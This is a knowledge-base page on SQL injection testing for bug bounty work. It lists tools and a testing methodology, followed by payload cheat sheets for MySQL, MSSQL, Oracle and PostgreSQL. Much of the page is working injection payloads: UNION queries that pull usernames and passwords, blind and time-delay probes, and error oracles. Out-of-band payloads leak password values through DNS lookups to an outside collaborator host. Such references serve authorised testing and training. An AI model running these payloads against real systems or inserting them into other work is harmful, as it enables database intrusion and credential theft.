---
title: "SQL Injection Testing & Database Exploitation Frameworks: Methodologies"
created: 2026-09-29
updated: 2026-09-29
type: concept
parent: "[[sql-injection-testing]]"
cluster: web-and-bug-bounty
tags:
  - sqli
  - bug-bounty
  - payload
sources:
  - sources/sql-injection.md
  - sources/sql-injection-notes.md
confidence: high
contested: false
contradictions: []
---
# SQL Injection Testing & Database Exploitation Frameworks: Methodologies


<!-- TOC_START -->
## Table of Contents
- [Methodologies](#methodologies)
  - [Tools](#tools)
    - [Automated SQLi Detection & Exploitation](#automated-sqli-detection-exploitation)
    - [Manual Testing Tools](#manual-testing-tools)
  - [Testing Methodology](#testing-methodology)
    - [Reconnaissance Phase](#reconnaissance-phase)
    - [Exploitation Phase](#exploitation-phase)
  - [Cheatsheets by Database](#cheatsheets-by-database)
    - [MySQL](#mysql)
    - [MSSQL](#mssql)
    - [Oracle](#oracle)
    - [PostgreSQL](#postgresql)
- [Related Pages](#related-pages)
<!-- TOC_END -->

## Methodologies

### Tools

#### Automated SQLi Detection & Exploitation

- **SQLmap 1.8+**: Now detects JSON‑based, GraphQL, and WebSocket SQLi automatically, plus smarter tamper chaining
- **GraphQLmap**: CLI tool for fuzzing and exploiting GraphQL resolver injections
- **NoSQLMap**: NoSQL database testing
- **Burp Suite Professional**: Enhanced SQL injection scanner with ML-based detection
- **Ghauri**: Advanced blind SQL injection tool (faster than SQLmap for time-based)
- **SQLiScanner**: Automated CI/CD integration for SQLi testing

#### Manual Testing Tools

- **Burp Suite**: Request manipulation and testing
- **OWASP ZAP**: Traffic interception and testing
- **FuzzDB/SecLists**: Attack payload collections
- **Havij**: Automated SQL injection tool with GUI
- **wscat**: WebSocket testing for SQLi in real-time connections
- **Postman/Insomnia**: API endpoint testing with GraphQL support

### Testing Methodology

#### Reconnaissance Phase

1. **Identify Entry Points**:
   - Map all user input parameters
   - Check HTTP POST/GET parameters
   - Examine cookies and HTTP headers
   - Review hidden form fields
   - Analyze API endpoints

2. **Determine Database Type**:
   - Observe error messages
   - Test database-specific syntax
   - Check HTTP headers and response patterns

#### Exploitation Phase

1. **Initial Testing**:

   ```sql
   # Test for errors
   parameter=test'
   parameter=test"
   parameter=test`

   # Boolean tests
   parameter=test' OR '1'='1
   parameter=test' AND '1'='2

   # UNION tests
   parameter=test' UNION SELECT 1-- -
   parameter=test' UNION SELECT 1,2-- -
   parameter=test' UNION SELECT 1,2,3-- -
   ```

2. **UNION Attack Technique**:

   ```sql
   # Find the number of columns
   ' UNION SELECT NULL-- -
   ' UNION SELECT NULL,NULL-- -
   ' UNION SELECT NULL,NULL,NULL-- -

   # Identify string columns
   ' UNION SELECT 'a',NULL,NULL-- -
   ' UNION SELECT NULL,'a',NULL-- -
   ' UNION SELECT NULL,NULL,'a'-- -

   # Extract data
   ' UNION SELECT username,password,NULL FROM users-- -
   ```

3. **Blind SQLi Exploitation**:

   ```sql
   # Boolean-based
   ' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 0,1)='a'-- -

   # Time-based
   ' AND (SELECT CASE WHEN (username='admin') THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users)-- -
   ```

4. **Database Enumeration**:
   - Determine database version
   - Extract table names
   - Extract column names
   - Extract data

5. **Privilege Escalation**:
   - Identify database user permissions
   - Access sensitive tables
   - Attempt file system access
   - Try command execution

### Cheatsheets by Database

#### MySQL

```sql
# Version
SELECT @@version

# Comments
-- Comment
# Comment
/*Comment*/

# String Concatenation
CONCAT('a','b')

# Substring
SUBSTRING('abc',1,1)

# Conditional
IF(1=1,'true','false')

# Time Delay
SLEEP(5)

# Data Sources
information_schema.tables
information_schema.columns
```

#### MSSQL

```sql
# Version
SELECT @@version

# Comments
-- Comment
/*Comment*/

# String Concatenation
'a'+'b'

# Substring
SUBSTRING('abc',1,1)

# Conditional
CASE WHEN 1=1 THEN 'true' ELSE 'false' END

# Time Delay
WAITFOR DELAY '0:0:5'

# Data Sources
information_schema.tables
information_schema.columns
sys.tables
sys.columns
```

#### Oracle

```sql
# Version
SELECT banner FROM v$version

# Comments
-- Comment
/*Comment*/

# String Concatenation
'a'||'b'

# Substring
SUBSTR('abc',1,1)

# Conditional
CASE WHEN 1=1 THEN 'true' ELSE 'false' END

# Time Delay
DBMS_PIPE.RECEIVE_MESSAGE('RDS',5)

# Data Sources
all_tables
all_tab_columns
```

#### PostgreSQL

```sql
# Version
SELECT version()

# Comments
-- Comment
/*Comment*/

# String Concatenation
'a'||'b'

# Substring
SUBSTRING('abc',1,1)

# Conditional
CASE WHEN 1=1 THEN 'true' ELSE 'false' END

# Time Delay
pg_sleep(5)

# Data Sources
information_schema.tables
information_schema.columns
```


### Advanced Multi-Database Syntax & Exfiltration Matrix

#### String Concatenation Matrix

| Database Engine | Concatenation Syntax | Example Payload |
| :--- | :--- | :--- |
| **Oracle** | `'foo' || 'bar'` | `' UNION SELECT username || '~' || password FROM users--` |
| **Microsoft SQL Server** | `'foo' + 'bar'` | `' UNION SELECT username + '~' + password FROM users--` |
| **PostgreSQL** | `'foo' || 'bar'` | `' UNION SELECT username || '~' || password FROM users--` |
| **MySQL** | `'foo' 'bar'` or `CONCAT('foo','bar')` | `' UNION SELECT CONCAT(username,'~',password) FROM users#` |

#### Substring Extraction Matrix

| Database Engine | Substring Function Syntax |
| :--- | :--- |
| **Oracle** | `SUBSTR('string', start, length)` (e.g. `SUBSTR(password, 1, 1)='a'`) |
| **Microsoft SQL Server** | `SUBSTRING('string', start, length)` |
| **PostgreSQL** | `SUBSTRING('string', start, length)` or `SUBSTR('string', start, length)` |
| **MySQL** | `SUBSTRING('string', start, length)` or `MID('string', start, length)` |

#### Out-of-Band (OAST) DNS Exfiltration Matrix

When web applications restrict inbound/outbound responses, attackers trigger asynchronous DNS lookups to capture extracted data strings:

| Database Engine | Out-of-Band Exfiltration Payload |
| :--- | :--- |
| **Oracle** | `SELECT UTL_INADDR.get_host_address(password || '.burpcollaborator.net') FROM users WHERE ROWNUM=1;` |
| **Microsoft SQL Server** | `EXEC master..xp_dirtree '\\' + (SELECT password FROM users WHERE id=1) + '.burpcollaborator.net\a';` |
| **PostgreSQL** | `COPY (SELECT '') TO PROGRAM 'nslookup ' || (SELECT password FROM users LIMIT 1) || '.burpcollaborator.net';` |
| **MySQL** | `SELECT LOAD_FILE(CONCAT('\\\\',(SELECT password FROM users LIMIT 1),'.burpcollaborator.net\\a'));` |

#### Conditional Error Oracles

- **Oracle**: `SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual;`
- **Microsoft SQL Server**: `SELECT CASE WHEN (1=1) THEN 1/0 ELSE NULL END;`
- **PostgreSQL**: `SELECT CASE WHEN (1=1) THEN CAST(1/0 AS text) ELSE '' END;`
- **MySQL**: `SELECT IF(1=1, (SELECT table_name FROM information_schema.tables),'');`

#### Time-Delay Command Matrix

| Database Engine | Time Delay Syntax | Example Injection Payload |
| :--- | :--- | :--- |
| **Oracle** | `dbms_pipe.receive_message(('a'), 10)` | `'+AND+1234=dbms_pipe.receive_message(('a'),10)--` |
| **Microsoft SQL Server** | `WAITFOR DELAY '0:0:10'` | `';+WAITFOR+DELAY+'0:0:10'--` |
| **PostgreSQL** | `pg_sleep(10)` | `'+AND+1234=(SELECT+1234+FROM+pg_sleep(10))--` |
| **MySQL** | `sleep(10)` | `'+AND+sleep(10)#` |


## Primary Sources & Provenance
- Provenance source anchors: [[sql-injection]], [[sql-injection-notes]]

## Related Pages
- [[sql-injection-testing]]
- [[web-and-bug-bounty]]